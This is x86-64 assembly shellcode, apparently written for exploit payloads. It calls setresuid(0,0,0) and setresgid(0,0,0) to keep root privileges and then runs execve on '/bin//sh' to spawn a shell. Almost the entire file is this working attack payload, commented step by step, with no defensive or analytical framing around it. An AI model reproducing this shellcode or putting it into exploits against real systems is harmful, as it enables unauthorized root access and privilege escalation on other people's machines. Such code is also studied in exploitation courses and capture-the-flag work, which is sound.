global _start

section .text 

_start:
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx ; 3rd argument: setresuid(), setresgid(), execve()
    xor rax, rax

retain_root_priv:
    ; setresuid(0,0,0)
    ; setresgid(0,0,0)

    add al, 117 ; Syscall for setresuid
    syscall     ; Calls kernel

    xor rax, rax
    add al, 119 ; Syscall for setresgid
    syscall     ; Calls kernel

pop_shell:
    xor rax, rax
    
    push rax    ; For null terminator
    push rax    ; For "/bin//sh"

    ; [ "/bin//sh" | null ] 
    mov dword [rsp], "/bin"     ; rsp -> "/bin"
    mov dword [rsp +4], "//sh"  ; rsp -> "/bin//sh"
    mov rdi, rsp                ; 1st arg: "/bin//sh"

    ; [ ptr to "/bin//sh" | null | "/bin//sh" | null ]  
    push rax        
    push rdi
    mov rsi, rsp                ; 2nd arg: ["/bin//sh",0]
   
    ; execve("/bin//sh",["/bin//sh",0],0) 
    add al, 59                  ; Syscall for execve()
    syscall                     ; Calls kernel
